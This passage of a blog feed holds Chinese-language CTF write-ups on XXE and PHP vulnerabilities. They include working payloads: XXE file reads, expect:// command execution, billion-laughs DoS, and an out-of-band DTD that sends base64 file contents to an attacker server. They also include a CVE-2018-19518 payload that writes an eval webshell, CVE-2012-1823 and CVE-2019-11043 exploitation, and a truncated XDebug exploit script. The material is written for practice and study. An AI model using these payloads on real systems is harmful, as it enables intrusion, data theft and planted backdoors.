会继续执行 or 右侧的 de。</span><br></pre></td></tr></table></figure><p>6.由于文件并没有对输入的字符进行过滤，所以可以进行语句闭合修改语句原本的意思，构建的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64160/?page=aa&#x27;) or system(&#x27;cat templates/flag.php&#x27;);//  or也可替换.</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;h2 id=&quot;Back-to-the-Future&quot;&gt;&lt;a href=&quot;#Back-to-the-Future&quot; class=&quot;headerlink&quot; title=&quot;Back to the Future&quot;&gt;&lt;/a&gt;Back to the Future&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="http://1768161086.github,io/2025/03/10/XXE/"/>
    <id>http://1768161086.github,io/2025/03/10/XXE/</id>
    <published>2025-03-10T10:30:10.000Z</published>
    <updated>2025-03-29T03:44:27.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、XML基础知识"><a href="#一、XML基础知识" class="headerlink" title="一、XML基础知识"></a>一、XML基础知识</h1><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>经过百度得知有几个文件可能会导致xxe漏洞，文件如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">├── dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">├── index.php</span><br><span class="line">├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知道有哪些文件可以导致xxe漏洞，直接dirsearch</p><p><strong>1.文件读取</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2.SSRF</strong></p><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><strong>3.RCE</strong></p><p>在安装expect扩展的PHP环境里执行系统命令，当然其他协议也有可能可以执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><strong>4. DDoS</strong></p><p>支持实体测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p><p><strong>5.Billion Laughs 攻击</strong></p><p>一个经典的Dos攻击payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ELEMENT lolz (#PCDATA)&gt; &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;...... &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>常规XXE</p><p>flag的路径是<code>/flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 允许加载外部实体</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">// xml文件来源于数据流</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">      // 加载xml实体，参数为替代实体、加载外部子集</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">      // 把 DOM 节点转换为 SimpleXMLElement 对象</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">      // 节点嵌套</span><br><span class="line">    $ctfshow = $creds-&gt;ctfshow;</span><br><span class="line">    echo $ctfshow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuite发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE payload [</span><br><span class="line">&lt;!ELEMENT payload ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/creds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web374-376"><a href="#web374-376" class="headerlink" title="web374~376"></a>web374~376</h2><p>区别在于没有回显，<strong>要把读取到的内容也就是flag传到远程服务器查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">if(isset($xmlfile))&#123;</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后几题把<a href="https://so.csdn.net/so/search?q=xml&spm=1001.2101.3001.7020">xml</a>头给过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;, $xmlfile))&#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里给出通杀方法：</p><p>在服务器上新建dtd文件，将读取到的flag发送到php</p><p><em>以下的<a href="http://xxx/%E6%8C%87%E4%BB%A3%E6%9C%8D%E5%8A%A1%E5%99%A8IP%EF%BC%8C%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E6%9B%BF%E6%8D%A2">http://xxx/指代服务器IP，根据自己情况替换</a></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># pd.dtd</span><br><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx/xxe.php?q=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>新建用于接收的php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># xxe.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$xxe = base64_decode($_GET[&#x27;q&#x27;]);</span><br><span class="line">$txt = &#x27;flag.txt&#x27;;</span><br><span class="line">file_put_contents($txt,$xxe,FILE_APPEND)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>burpsuite发包，后几题过滤了xml头，其实可以省略的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/pd.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">] &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>要求从公网能访问dtd和php文件</strong></p><p>如果运行正常，flag已经写入了txt<br>CTFshow XXE web378</p><hr><hr><p>题目描述：python X</p><p>考点：无回显XXE，外部实体，绕过过滤。</p><p>开题是一个登录框</p><p>F12直接能看见源码，一眼XXE。</p><p>随便输入抓个包，一眼XXE，节点名字都告诉我们了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在路由<code>/doLogin</code>下发POST包。</p><p>python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://6237f178-ba4b-4c2d-8749-f45d3a41e8b2.challenge.ctf.show/doLogin&#x27;</span><br><span class="line"></span><br><span class="line">payload=&quot;&quot;&quot;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;&amp;xxe;&lt;/password&gt;&lt;/user&gt;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">print(requests.post(url,data=payload).text)</span><br></pre></td></tr></table></figure><h2 id="GHCTF2025-﹏"><a href="#GHCTF2025-﹏" class="headerlink" title="GHCTF2025(&gt;﹏&lt;)"></a>GHCTF2025(&gt;﹏&lt;)</h2><p>根据源码可知&#x2F;ghctf 路由接受POST参数xml，同时解析时允许解析外部实体。很明显存在XXE；也没有存在任何的过滤；直接打就⾏了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://node2.anna.nssctf.cn:28487/ghctf&quot;</span><br><span class="line">xml = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test[</span><br><span class="line">   &lt;!ENTITY nn SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">   &lt;name&gt;&amp;nn;&lt;/name&gt;</span><br><span class="line">   &lt;age&gt;18&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;&#x27;&#x27;&#x27;</span><br><span class="line">response = requests.post(url, data=&#123;&quot;xml&quot;: xml&#125;)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="ISCTF2023ez-php"><a href="#ISCTF2023ez-php" class="headerlink" title="ISCTF2023ez_php"></a>ISCTF2023ez_php</h2><p>html附件看了下源码，发现extract变量覆盖和XXE注入漏洞：</p><p>这个XML表单已经很显然了，现在就是想办法把这个XML回显给弄上去。</p><p>我们再看一下function.php：</p><p>1.在function.php这里有三个方法，注册一个用户就会创建<code>$user_info_dir.$username</code>的目录，并新建一个用户名.xml的文件，并把$user_xml写入，而且最关键的是这里所有的变量都是可控的。</p><p>2.追溯一下$user_info_dir，在config.php文件中，默认路径为：&#x2F;tmp&#x2F;users&#x2F;，但我们也可以改成：&#x2F;var&#x2F;www&#x2F;html&#x2F;  ：</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/register.php?username=123&amp;password=1&amp;config[&#x27;user_info_dir&#x27;]=/var/www/html/</span><br></pre></td></tr></table></figure><p>由上可以知道，会创建一个跟username名字相同文件名的文件，以及内部一个同名xml，访问一下123&#x2F;123.xml</p><p>3.获得了回显。</p><p>那么接下来就是老生常谈的XXE：</p><p>从function.php里的：</p><p>4.也能显然看出，这里可以接受外部实体注入，XXE坐实了。</p><p>用register.php里面的XML格式，我们可以构造出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user_xml_format=&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt; ]&gt;</span><br><span class="line">                    &lt;userinfo&gt;</span><br><span class="line">                            &lt;user&gt;</span><br><span class="line">                                &lt;username&gt;%26xxe;&lt;/username&gt;</span><br><span class="line">                                &lt;password&gt;123&lt;/password&gt;</span><br><span class="line">                            &lt;/user&gt;</span><br><span class="line">                        &lt;/userinfo&gt;</span><br></pre></td></tr></table></figure><p>5.利用password报错出username的回显，试试能不能任意文件读取：</p><p>返回页面输入用户名和密码获得回显</p><p>6.然后直接路径穿越读flag试试，结果直接就出了：</p><h2 id="【2024夏季个人挑战赛】exx"><a href="#【2024夏季个人挑战赛】exx" class="headerlink" title="【2024夏季个人挑战赛】exx?"></a>【2024夏季个人挑战赛】exx?</h2><p>扫描目录发现&#x2F;dom.php</p><p><a href="https://so.csdn.net/so/search?q=DOM&spm=1001.2101.3001.7020">DOM</a>和题目名字ExX，联想XXE漏洞</p><p>post传参</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE payload [</span><br><span class="line">&lt;!ELEMENT payload ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、XML基础知识&quot;&gt;&lt;a href=&quot;#一、XML基础知识&quot; class=&quot;headerlink&quot; title=&quot;一、XML基础知识&quot;&gt;&lt;/a&gt;一、XML基础知识&lt;/h1&gt;&lt;p&gt;XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php漏洞</title>
    <link href="http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/"/>
    <id>http://1768161086.github,io/2025/03/10/php%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-03-10T10:30:01.000Z</published>
    <updated>2025-03-10T10:31:03.790Z</updated>
    
    <content type="html"><![CDATA[<p>1.SSRF漏洞<br>2.php7.1.33CVE-2019-11043，远程代码执行漏洞<br>该漏洞位于PHP-FPM模块的env_path_info函数，在特定的nginx + php-fpm配置中，web用户就可能会进行代码执行。该漏洞需要在nginx.conf中进行特定配置才能触发。配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.php(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO       $fastcgi_path_info;</span><br><span class="line">  fastcgi_pass   php:9000;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用%0a（换行符）来破坏正则，从而使得PATH_INFO为空</p><p>利用条件： nginx配置了fastcgi_split_path_info</p><p>受影响系统： PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p><p>复现需要golang环境</p><p>漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . &quot;http://92cdd785-55c4-4b35-85fa-ae1dc7fdc367.challenge.ctf.show/index.php&quot;</span><br></pre></td></tr></table></figure><p>3.PHP&#x2F;5.6.38CVE-2018-19518（远程命令执行漏洞）</p><p>影响版本：PHP 5.6.x &lt; 5.6.39</p><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 原始payload</span><br><span class="line">x+-oProxyCommand=echo    echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; /var/www/html/1.php|base64    -d|sh&#125;</span><br><span class="line"></span><br><span class="line"># base64+url编码以后</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br><span class="line"></span><br><span class="line"># 模板</span><br><span class="line">hostname=x+-oProxyCommand%3decho%09【要执行命令的base64】|base64%09-d|sh&#125;&amp;username=xxx&amp;password=xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>4.受影响系统PHP &lt; 5.3.12 、 PHP &lt; 5.4.2:​ CVE-2012-1823是在php-cgi运行模式下出现的漏洞，其漏洞只出现在以cgi模式运行的php中。</p><p>漏洞利用</p><p>​ cgi模式下有如下可控命令行参数可用：</p><p>-c 指定php.ini文件（PHP的配置文件）的位置<br>-n 不要加载php.ini文件<br>-d 指定配置项<br>-b 启动fastcgi进程<br>-s 显示文件源码<br>-T 执行指定次该文件<br>-h和-? 显示帮助<br>4.1那么最简单的利用方式就是?-s可以直接显示源码</p><p>4.2一个更好的利用方法是通过使用-d指定auto_prepend_file来制造任意文件包含漏洞，执行任意代码：（其中用“+”代替了“空格”，并将“&#x3D;”和“:”进行了URL编码）</p><p>​ 其原理是：利用可控命令行参数 -d 将allow_url_include 得值设为 on 并使用 auto_prepend_file 函数在页面顶部加载文件，而构造加载的文件为 php:&#x2F;&#x2F;input 读取的原始POST数据(也就是传输的数据 <?php echo shell_exec("ls");?> 的执行结果)，并传递到回应包里。构造请求包如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&quot;ls&quot;);?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5.XDebug 远程调试漏洞,debug开启，端口9000</p><p>条件：</p><p>开启了远程调试模式，并设置<code>remote_connect_back = 1</code></p><p>xdebug.remote_connect_back &#x3D; 1</p><p>xdebug.remote_enable &#x3D; 1</p><p>这个配置下，我们访问<a href="http://target-url/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target-url/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>利用脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(1)</span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def recv_xml(sock):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = b&#x27;&#x27;</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            data = data + sock.recv(1024)</span><br><span class="line">        except socket.error as e:</span><br><span class="line">            break</span><br><span class="line">        if not data:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        while data:</span><br><span class="line">            eop = 